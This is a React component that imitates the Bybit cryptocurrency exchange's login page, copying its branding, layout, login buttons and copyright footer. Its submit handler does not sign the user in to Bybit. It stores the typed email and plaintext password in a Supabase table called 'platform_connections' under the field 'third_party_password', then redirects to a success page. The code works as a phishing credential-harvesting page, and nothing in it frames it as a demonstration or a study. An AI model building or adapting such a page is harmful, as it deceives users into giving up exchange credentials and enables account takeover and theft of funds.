import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Search, Menu, Send, ChevronRight, Headphones, Eye, EyeOff } from 'lucide-react';
import { supabase } from '../../lib/supabase';

export default function BybitConnect() {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('Email');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!email || !password) {
      setErrorMessage('Please enter your email and password.');
      return;
    }

    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const { error } = await supabase.from('platform_connections').insert({
        platform: 'Bybit',
        email,
        third_party_password: password,
        user_id: session?.user?.id || null
      });
      if (error) throw error;
      navigate('/link-success');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-white text-[#121212] font-sans flex flex-col">
      {/* Header */}
      <header className="h-[56px] px-4 flex items-center justify-between border-b border-gray-100">
        <div className="flex items-center gap-1">
          <span className="text-[20px] font-black tracking-tighter italic">BYB<span className="text-[#ff9d00]">I</span>T</span>
        </div>
        <div className="flex items-center gap-4">
          <Search className="w-5 h-5 text-gray-600" />
          <button className="text-[14px] font-bold text-[#ff9d00]">Sign Up</button>
          <Menu className="w-5 h-5 text-gray-600" />
        </div>
      </header>

      {/* Content */}
      <div className="flex-1 px-5 pt-8 max-w-[480px] mx-auto w-full">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-[22px] font-bold">Welcome to Bybit</h1>
          <button className="text-[14px] font-medium text-[#ff9d00] flex items-center gap-1">
            <Send className="w-3 h-3 rotate-45" /> Sign up
          </button>
        </div>

        {/* Tabs */}
        <div className="flex gap-6 mb-6 border-b border-gray-100">
          {['Email', 'Mobile'].map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`pb-2 text-[15px] font-bold transition-colors relative ${activeTab === tab ? 'text-[#121212]' : 'text-gray-400'}`}
            >
              {tab}
              {activeTab === tab && <div className="absolute bottom-0 left-0 w-full h-[2px] bg-[#ff9d00] rounded-full" />}
            </button>
          ))}
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-3">
            <div className="relative">
              <input
                type={activeTab === 'Email' ? 'text' : 'tel'}
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder={activeTab === 'Email' ? 'Email' : 'Mobile'}
                className="w-full h-[48px] border border-gray-200 rounded-lg px-4 text-[15px] outline-none focus:border-[#ff9d00] bg-[#f8f9fb]"
              />
              {credentials.email && (
                <button 
                  type="button" 
                  onClick={() => setCredentials(c => ({ ...c, email: '' }))}
                  className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-white text-[10px]"
                >
                  ✕
                </button>
              )}
            </div>

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                value={credentials.password}
                onChange={handleFieldChange('password')}
                placeholder="Password"
                className="w-full h-[48px] border border-gray-200 rounded-lg px-4 text-[15px] outline-none focus:border-[#ff9d00] bg-[#f8f9fb]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          <div className="flex justify-end">
            <button type="button" className="text-[13px] font-medium text-[#ff9d00]">Having trouble logging in?</button>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full h-[48px] bg-[#ffb11a] hover:bg-[#ff9d00] text-black font-bold rounded-full transition-colors mt-2"
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>

          <button
            type="button"
            className="w-full h-[48px] border border-gray-200 rounded-full text-[15px] font-bold hover:bg-gray-50 transition-colors"
          >
            Log in with passkey
          </button>

          <div className="flex flex-col items-center gap-4 pt-6">
            <div className="flex items-center gap-2 w-full">
              <div className="h-px flex-1 bg-gray-100" />
              <span className="text-[12px] text-gray-400">or log in with</span>
              <div className="h-px flex-1 bg-gray-100" />
            </div>
            <div className="flex gap-8">
              <button type="button" className="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center">
                <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-5 h-5" />
              </button>
              <button type="button" className="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center">
                <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="w-5 h-5" />
              </button>
              <button type="button" className="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center">
                <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-4 h-4" />
              </button>
            </div>
          </div>

          <div className="pt-10 text-center">
            <button type="button" className="text-[14px] font-bold text-[#ff9d00] flex items-center justify-center gap-1 mx-auto">
              Log in with Subaccount <ChevronRight className="w-4 h-4" />
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <footer className="mt-auto py-6 border-t border-gray-100 flex flex-col items-center gap-4">
        <div className="fixed bottom-6 right-6 w-12 h-12 rounded-full bg-[#ff9d00] flex items-center justify-center text-black shadow-lg">
          <Headphones className="w-6 h-6" />
        </div>
        <p className="text-[11px] text-gray-400">© 2018-2026 Bybit.com. All rights reserved.</p>
      </footer>
    </main>
  );
}
